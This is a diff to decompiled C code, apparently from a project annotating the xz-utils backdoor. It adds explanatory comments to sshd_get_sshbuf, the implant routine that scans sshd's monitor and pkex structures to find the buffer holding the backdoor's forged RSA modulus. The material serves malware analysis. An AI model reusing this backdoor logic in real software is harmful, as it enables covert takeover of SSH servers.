@@ -5,10 +5,11 @@
 
 
 /*
- * AutoDoc: Recovers the `sshbuf` that now holds the forged modulus inside sshd's monitor context. It validates the cached
- * `monitor_struct_slot`, uses `sshd_offsets` to locate the pkex table plus the sshbuf data/size fields, and either dereferences the
- * known slot or brute-forces the pkex array when offsets are unknown. Every candidate goes through `sshbuf_extract`; two buffers
- * must decode to the SSH banner string IDs before the third is accepted as the negative bignum carrying the fake modulus.
+ * AutoDoc: Recovers the `sshbuf` that holds the forged modulus inside sshd's monitor context. It validates the cached
+ * `monitor_struct_slot`, resolves the pkex table pointer either via `monitor->pkex_table` or the dword-index override stored in
+ * `sshd_offsets`, and then locates the candidate `sshbuf *` inside each pkex slot using either the cached qword index or a 0x400-byte
+ * scan. Every candidate goes through `sshbuf_extract`; two buffers must decode to the SSH banner string IDs before the third is
+ * accepted as the negative bignum carrying the fake modulus.
  */
 
 #include "xzre_types.h"
@@ -16,7 +17,7 @@
 BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
 
 {
-  kex *pkex_table_end;
+  kex *pkex_scan_end;
   sbyte pkex_slot_index;
   sbyte size_index;
   sbyte data_index;
@@ -42,6 +43,7 @@ BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
       // AutoDoc: Start from the in-struct pkex table pointer; when the offsets cache supplies an override we follow that instead.
       pkex_table = monitor_ptr->pkex_table;
       if (-1 < pkex_slot_index) {
+        // AutoDoc: Offset override: `monitor_pkex_table_dword_index` selects which 32-bit slot inside `struct monitor` holds the pkex table pointer.
         pkex_table = *(kex ***)((long)&monitor_ptr->child_to_monitor_fd + (long)((int)pkex_slot_index << 2));
       }
       size_index = (ctx->sshd_offsets).bytes.sshbuf_size_qword_index;
@@ -58,13 +60,14 @@ BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
       }
       probe_ok = is_range_mapped((u8 *)pkex_table,8,ctx);
       if ((probe_ok != FALSE) &&
+         // AutoDoc: Sanity-check the pkex base before dereferencing: the brute-force path scans 0x400 bytes (128 qwords) in 8-byte strides.
          (probe_ok = is_range_mapped(&(*pkex_table)->opaque,0x400,ctx), probe_ok != FALSE)) {
         pkex_slot_index = (ctx->sshd_offsets).bytes.kex_sshbuf_qword_index;
         pkex_cursor = *pkex_table;
         if (pkex_slot_index < '\0') {
           banner_hits = 0;
-          pkex_table_end = pkex_cursor + 0x400;
-          for (; pkex_cursor < pkex_table_end; pkex_cursor = pkex_cursor + 8) {
+          pkex_scan_end = pkex_cursor + 0x400;
+          for (; pkex_cursor < pkex_scan_end; pkex_cursor = pkex_cursor + 8) {
             // AutoDoc: Walk each pkex slot only if its inline struct is mapped—a partially initialised monitor entry is ignored.
             probe_ok = is_range_mapped(&pkex_cursor->opaque,pkex_entry_span,ctx);
             if ((probe_ok != FALSE) &&
@@ -89,6 +92,7 @@ BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
           }
         }
         else {
+          // AutoDoc: Fast path: when `kex_sshbuf_qword_index` is known, index directly into the kex struct and validate that sshbuf as the forged modulus carrier.
           probe_ok = sshbuf_extract(*(sshbuf **)(pkex_cursor + ((int)pkex_slot_index << 3)),ctx,&sshbuf->d,
                                  &sshbuf->size);
           if (probe_ok != FALSE) {
